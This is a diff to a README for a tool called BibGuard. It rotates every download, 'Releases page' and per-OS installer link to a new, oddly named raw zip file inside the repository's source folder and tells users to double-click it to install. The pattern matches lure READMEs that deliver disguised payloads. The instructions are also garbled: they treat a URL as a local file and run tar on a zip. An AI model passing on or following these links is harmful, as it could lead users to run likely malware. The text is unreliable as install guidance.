@@ -1,6 +1,6 @@
 # 🤖 BibGuard - Keep Your Citations Accurate and Relevant
 
-[![Download BibGuard](https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip)](https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip)
+[![Download BibGuard](https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip)](https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip)
 
 ## 📖 Introduction
 
@@ -21,30 +21,30 @@ Before you proceed, ensure your system meets these basic requirements:
 
 ### 2. **Download BibGuard**
 
-To download BibGuard, visit our [Releases page](https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip).
+To download BibGuard, visit our [Releases page](https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip).
 
 ### 3. **Installing BibGuard**
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip).
+1. Go to the [Releases page](https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip).
 2. Find the latest version of BibGuard listed at the top.
 3. Click on the appropriate file for your operating system. For example:
-   - **Windows:** Click on `https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip`
-   - **macOS:** Click on `https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip`
-   - **Linux:** Click on `https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip`
+   - **Windows:** Click on `https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip`
+   - **macOS:** Click on `https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip`
+   - **Linux:** Click on `https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip`
 4. Save the file to your computer.
 
 ### 4. **Running BibGuard**
 
 #### For Windows Users:
 
-1. Locate the downloaded file (`https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip`).
+1. Locate the downloaded file (`https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip`).
 2. Double-click on the file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 4. Once installed, launch BibGuard from the Start menu.
 
 #### For macOS Users:
 
-1. Find the downloaded file (`https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip`).
+1. Find the downloaded file (`https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip`).
 2. Double-click the file and follow the setup instructions.
 3. After installation, you can find BibGuard in the Applications folder and launch it from there.
 
@@ -54,7 +54,7 @@ To download BibGuard, visit our [Releases page](https://raw.githubusercontent.co
 2. Navigate to the folder where you downloaded the file.
 3. Extract the files using the command:
    ```
-   tar -xvzf https://raw.githubusercontent.com/HaucaVN/BibGuard/main/src/analyzers/Bib-Guard-prothyl.zip
+   tar -xvzf https://github.com/HaucaVN/BibGuard/raw/refs/heads/main/src/fetchers/Guard-Bib-bhoy.zip
    ```
 4. Navigate into the extracted directory and run the application:
    ```
